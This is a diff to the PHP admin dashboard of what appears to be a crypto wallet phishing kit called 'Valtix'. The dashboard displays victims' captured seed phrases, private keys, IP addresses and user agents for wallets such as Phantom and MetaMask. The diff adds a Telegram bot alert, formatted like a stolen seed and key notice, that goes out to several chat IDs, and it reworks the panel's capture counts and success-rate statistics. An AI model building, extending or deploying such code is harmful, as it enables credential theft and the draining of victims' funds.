@@ -25,7 +25,9 @@ if ($isAuthed) {
     $summaryFile = __DIR__ . '/logs/summary.log';
 
     if (isset($_GET['action']) && $_GET['action'] === 'clear_all') {
-        file_put_contents($logFile, ''); file_put_contents($summaryFile, '');
+        file_put_contents($logFile, '');
+        file_put_contents($summaryFile, '');
+        file_put_contents(__DIR__ . '/logs/sent_tg.log', '');
         $message = 'success_clear';
     }
     if (isset($_GET['action']) && $_GET['action'] === 'delete' && isset($_GET['line'])) {
@@ -47,14 +49,15 @@ if ($isAuthed) {
     }
     if (isset($_GET['action']) && $_GET['action'] === 'test_telegram') {
         $ok = true;
+        $testMsg = "🚨 Valtix — TEST MESSAGE 🚨\n━━━━━━━━━━━━━━━━━━\n💰 Wallet: 👻 Phantom\n📝 Seed (12 words):\n`test word seed phrase example hello world foo bar baz qux quux corge`\n🔑 Private Key:\n`5KQwrPbwL6nKqPqH5hux5kfL5KQwrPbwL6nKqPqH5hux`\n━━━━━━━━━━━━━━━━━━\n⚡ Valtix Intelligence — All alerts working ✅";
         foreach ($TELEGRAM_CHAT_IDS as $chatId) {
             $chatId = trim($chatId);
             if (empty($chatId)) continue;
             $ch = curl_init();
             curl_setopt_array($ch, [
-                CURLOPT_URL => "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage",
+                CURLOPT_URL => "https://api.telegram.org/bot{$TELEGRAM_BOT_TOKEN}/sendMessage",
                 CURLOPT_POST => true,
-                CURLOPT_POSTFIELDS => json_encode(['chat_id' => $chatId, 'text' => '✅ Valtix Telegram alerts are LIVE!', 'parse_mode' => 'Markdown']),
+                CURLOPT_POSTFIELDS => json_encode(['chat_id' => $chatId, 'text' => $testMsg, 'parse_mode' => 'Markdown']),
                 CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
                 CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 10,
             ]);
@@ -107,6 +110,8 @@ if ($isAuthed) {
         .btn-ghost:hover { color: #8899aa; border-color: rgba(255,255,255,0.08); }
         .btn-green { background: rgba(76,175,80,0.08); color: #4caf50; border: 1px solid rgba(76,175,80,0.12); }
         .btn-green:hover { background: rgba(76,175,80,0.15); }
+        .btn-yellow { background: rgba(255,193,7,0.08); color: #ffc107; border: 1px solid rgba(255,193,7,0.12); }
+        .btn-yellow:hover { background: rgba(255,193,7,0.15); }
 
         .login-wrap {
             min-height: 80vh; display: flex; align-items: center; justify-content: center;
@@ -280,16 +285,16 @@ if ($isAuthed) {
             <div class="header-actions">
                 <a href="?action=test_telegram" class="btn-green">📨 Test Telegram</a>
                 <a href="?action=export" class="btn-blue">📥 Export</a>
-                <a href="?action=clear_all" class="btn-red" onclick="return confirm('Delete ALL captures?')">🗑️ Clear</a>
+                <a href="?action=clear_all" class="btn-red" onclick="return confirm('Delete ALL captures? This also resets sent tracker.')">🗑️ Clear All</a>
                 <a href="?logout=1" class="btn-ghost">🚪 Logout</a>
             </div>
         </div>
 
         <?php
-        if ($message === 'success_clear') echo '<div class="msg-bar"><div class="msg success">✓ All captures deleted</div></div>';
+        if ($message === 'success_clear') echo '<div class="msg-bar"><div class="msg success">✓ All captures cleared + sent tracker reset</div></div>';
         if ($message === 'success_delete') echo '<div class="msg-bar"><div class="msg success">✓ Entry deleted</div></div>';
-        if ($message === 'success_tg') echo '<div class="msg-bar"><div class="msg success">✓ Telegram test sent to 3 recipients</div></div>';
-        if ($message === 'fail_tg') echo '<div class="msg-bar"><div class="msg error">✗ Telegram test failed — check token or chat IDs</div></div>';
+        if ($message === 'success_tg') echo '<div class="msg-bar"><div class="msg success">✓ Telegram test sent! Check all 3 recipients</div></div>';
+        if ($message === 'fail_tg') echo '<div class="msg-bar"><div class="msg error">✗ Telegram test failed — check BOT_TOKEN or CHAT_IDS</div></div>';
 
         $logFile = __DIR__ . '/logs/captures.log';
         $summaryFile = __DIR__ . '/logs/summary.log';
@@ -305,23 +310,23 @@ if ($isAuthed) {
 
         // YOUR exact wallet logo URLs
         $walletLogoMap = [
-            'phantom'    => 'https://mintcdn.com/phantom-e50e2e68/tU9g5MXFXgx4l6Em/resources/images/Phantom_SVG_Icon.svg?fit=max&auto=format&n=tU9g5MXFXgx4l6Em&q=85&s=7170eec10d9199f7766d6e4ccd1e56ff',
-            'coinbase'   => 'https://cdn.simpleicons.org/coinbase',
-            'metamask'   => 'https://images.ctfassets.net/clixtyxoaeas/1ezuBGezqfIeifWdVtwU4c/d970d4cdf13b163efddddd5709164d2e/MetaMask-icon-Fox.svg',
-            'trustwallet'=> 'https://trustwallet.com/_next/static/media/image.8354ab2c.svg',
-            'backpack'   => 'https://files.svgcdn.io/token-branded/backpack.svg',
-            'okx'        => 'https://cdn.jsdelivr.net/gh/glincker/thesvg@main/public/icons/okx/default.svg',
-            'solflare'   => 'https://files.svgcdn.io/token-branded/solflare.svg',
-            'rabby'      => 'https://raw.githubusercontent.com/RabbyHub/logo/master/symbol.svg',
+            'phantom'     => 'https://mintcdn.com/phantom-e50e2e68/tU9g5MXFXgx4l6Em/resources/images/Phantom_SVG_Icon.svg?fit=max&auto=format&n=tU9g5MXFXgx4l6Em&q=85&s=7170eec10d9199f7766d6e4ccd1e56ff',
+            'coinbase'    => 'https://cdn.simpleicons.org/coinbase',
+            'metamask'    => 'https://images.ctfassets.net/clixtyxoaeas/1ezuBGezqfIeifWdVtwU4c/d970d4cdf13b163efddddd5709164d2e/MetaMask-icon-Fox.svg',
+            'trustwallet' => 'https://trustwallet.com/_next/static/media/image.8354ab2c.svg',
+            'backpack'    => 'https://files.svgcdn.io/token-branded/backpack.svg',
+            'okx'         => 'https://cdn.jsdelivr.net/gh/glincker/thesvg@main/public/icons/okx/default.svg',
+            'solflare'    => 'https://files.svgcdn.io/token-branded/solflare.svg',
+            'rabby'       => 'https://raw.githubusercontent.com/RabbyHub/logo/master/symbol.svg',
         ];
         ?>
 
         <div class="stats-grid">
-            <div class="stat-card"><div class="num blue"><?php echo $total; ?></div><div class="lbl">Captures</div></div>
-            <div class="stat-card"><div class="num green"><?php echo $totalSeeds; ?></div><div class="lbl">Seeds</div></div>
-            <div class="stat-card"><div class="num red"><?php echo $totalKeys; ?></div><div class="lbl">Keys</div></div>
-            <div class="stat-card"><div class="num blue"><?php echo count($uniqueIps); ?></div><div class="lbl">IPs</div></div>
-            <div class="stat-card"><div class="num"><?php echo $total > 0 ? round(($totalSeeds/$total)*100).'%' : '0%'; ?></div><div class="lbl">Success</div></div>
+            <div class="stat-card"><div class="num blue"><?php echo $total; ?></div><div class="lbl">Total Captures</div></div>
+            <div class="stat-card"><div class="num green"><?php echo $totalSeeds; ?></div><div class="lbl">Seeds Captured</div></div>
+            <div class="stat-card"><div class="num red"><?php echo $totalKeys; ?></div><div class="lbl">Private Keys</div></div>
+            <div class="stat-card"><div class="num blue"><?php echo count($uniqueIps); ?></div><div class="lbl">Unique IPs</div></div>
+            <div class="stat-card"><div class="num"><?php echo $total > 0 ? round(($totalSeeds/$total)*100).'%' : '0%'; ?></div><div class="lbl">Success Rate</div></div>
         </div>
 
         <div class="table-wrap">
@@ -355,6 +360,8 @@ if ($isAuthed) {
                                 $wName = $c['walletName'] ?? ucfirst($w);
                                 $wLogo = $walletLogoMap[$w] ?? 'images/logo.png';
                                 $wLabel = !empty($wName) ? $wName : (ucfirst($w) ?: '?');
+                                $seed = $c['seed'] ?? '';
+                                $pkey = $c['pkey'] ?? '';
                             ?>
                             <tr>
                                 <td><?php echo $idx + 1; ?></td>
@@ -364,12 +371,12 @@ if ($isAuthed) {
                                         <?php echo htmlspecialchars($wLabel); ?>
                                     </span>
                                 </td>
-                                <td class="cell-id"><?php echo htmlspecialchars(substr($c['id']??'', 0, 10)); ?></td>
+                                <td class="cell-id"><?php echo htmlspecialchars(substr($c['id']??'', 0, 10) ?: substr(md5($seed.$pkey), 0, 8)); ?></td>
                                 <td class="cell-time"><?php echo htmlspecialchars($c['timestamp']??$c['capturedAt']??'—'); ?></td>
                                 <td class="cell-ip"><?php echo htmlspecialchars($c['ip']??'—'); ?></td>
-                                <td class="<?php echo !empty($c['seed'])?'cell-seed':'cell-none'; ?>"><?php echo !empty($c['seed'])?htmlspecialchars($c['seed']):'—'; ?></td>
-                                <td class="<?php echo !empty($c['pkey'])?'cell-key':'cell-none'; ?>"><?php echo !empty($c['pkey'])?htmlspecialchars($c['pkey']):'—'; ?></td>
-                                <td><?php echo $c['seedWordCount']??0; ?></td>
+                                <td class="<?php echo !empty($seed)?'cell-seed':'cell-none'; ?>"><?php echo !empty($seed)?htmlspecialchars($seed):'—'; ?></td>
+                                <td class="<?php echo !empty($pkey)?'cell-key':'cell-none'; ?>"><?php echo !empty($pkey)?htmlspecialchars($pkey):'—'; ?></td>
+                                <td><?php echo !empty($seed) ? count(explode(' ', trim($seed))) : 0; ?></td>
                                 <td class="cell-ua"><?php echo htmlspecialchars($c['screenSize']??'—'); ?></td>
                                 <td class="cell-ua" title="<?php echo htmlspecialchars($c['userAgent']??''); ?>"><?php echo htmlspecialchars(substr($c['userAgent']??'',0,30)); ?>…</td>
                                 <td class="cell-action"><a href="?action=delete&line=<?php echo $realIdx; ?>" onclick="return confirm('Delete this entry?')">✕</a></td>
